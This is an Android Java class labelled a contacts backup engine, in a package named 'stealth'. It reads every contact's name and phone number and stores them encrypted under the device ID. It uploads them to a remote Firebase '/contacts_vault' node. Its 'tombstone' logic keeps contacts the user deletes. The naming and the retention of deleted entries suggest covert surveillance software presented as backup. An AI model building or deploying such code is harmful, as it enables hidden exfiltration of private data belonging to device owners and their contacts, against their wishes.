package com.notrack.stealth.backup;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.notrack.stealth.db.AppDatabase;
import com.notrack.stealth.db.ContactEntity;
import com.notrack.stealth.security.EncryptionUtils;
import com.notrack.stealth.sync.FirebaseHelper;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * PRODUCTION-GRADE CONTACTS TELEMETRY & DELETION TRACKING ENGINE
 *
 * Implements:
 * 1. Read-only contacts directory scraping.
 * 2. Tombstone Deletion Engine: Detects deleted address book contacts and marks them preserved.
 * 3. Hardware AES-256-GCM Envelope Encryption (Isolated /contacts_vault node).
 * 4. Idempotent Firebase Realtime Database Sync.
 */
public class ContactsBackupEngine {

    private static final String TAG = "ContactsBackupEngine";
    private static final ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();

    public static void triggerSyncAsync(Context context) {
        if (context == null) return;
        final Context appCtx = context.getApplicationContext();
        EXECUTOR.execute(() -> scanAndSyncContacts(appCtx));
    }

    public static void scanAndSyncContacts(Context context) {
        if (context == null) return;

        // Check permission
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "READ_CONTACTS permission not granted. Standing by.");
            return;
        }

        try {
            AppDatabase db = AppDatabase.getInstance(context);
            String deviceId = fetchDeviceId(context);

            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = new String[]{
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
            };

            Set<String> currentNativeIds = new HashSet<>();
            List<ContactEntity> newEntities = new ArrayList<>();

            try (Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    int idCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
                    int nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int phoneCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                    do {
                        String contactId = cursor.getString(idCol);
                        if (contactId == null) continue;
                        currentNativeIds.add(contactId);

                        if (db.contactDao().exists(contactId) == 0) {
                            String rawName = cursor.getString(nameCol);
                            String rawPhone = cursor.getString(phoneCol);

                            if (rawName == null) rawName = "Unknown Contact";
                            if (rawPhone == null) rawPhone = "";

                            EncryptionUtils.EncryptedPayload nameEnc = EncryptionUtils.encryptWebCrypto(rawName);
                            EncryptionUtils.EncryptedPayload phoneEnc = EncryptionUtils.encryptWebCrypto(rawPhone);

                            ContactEntity entity = new ContactEntity(
                                    contactId,
                                    deviceId,
                                    nameEnc.ciphertextBase64,
                                    phoneEnc.ciphertextBase64,
                                    nameEnc.nonceBase64,
                                    "",
                                    System.currentTimeMillis(),
                                    false,
                                    0L,
                                    false
                            );
                            newEntities.add(entity);
                        }
                    } while (cursor.moveToNext());
                }
            }

            // 1. Tombstone Deletion Detection:
            List<String> activeDbIds = db.contactDao().getActiveContactIds();
            if (activeDbIds != null && !activeDbIds.isEmpty()) {
                List<String> deletedIds = new ArrayList<>();
                for (String dbId : activeDbIds) {
                    if (!currentNativeIds.contains(dbId)) {
                        deletedIds.add(dbId);
                    }
                }

                if (!deletedIds.isEmpty()) {
                    long now = System.currentTimeMillis();
                    db.contactDao().markContactsAsDeleted(deletedIds, now);
                    Log.i(TAG, "Tombstone engine detected " + deletedIds.size() + " deleted contacts! Preserving in vault.");
                }
            }

            // 2. Persist new entities to Room DB
            if (!newEntities.isEmpty()) {
                db.contactDao().insertAll(newEntities);
                Log.i(TAG, "Captured " + newEntities.size() + " new contacts.");
            }

            // 3. Flush unsynced contacts to Firebase RTDB /contacts_vault
            List<ContactEntity> pending = db.contactDao().getUnsyncedContacts(50);
            if (pending != null && !pending.isEmpty()) {
                List<Long> syncedIds = new ArrayList<>();
                for (ContactEntity contact : pending) {
                    boolean success = FirebaseHelper.sendContactRestPut(contact);
                    if (success) {
                        syncedIds.add(contact.id);
                    }
                }
                if (!syncedIds.isEmpty()) {
                    db.contactDao().markAsSynced(syncedIds);
                    Log.i(TAG, "Synced " + syncedIds.size() + " contacts to Firebase /contacts_vault.");
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Error in Contacts backup engine: " + e.getMessage(), e);
        }
    }

    private static String fetchDeviceId(Context context) {
        try {
            String id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id != null ? id : "unknown_device";
        } catch (Exception e) {
            return "unknown_device";
        }
    }
}
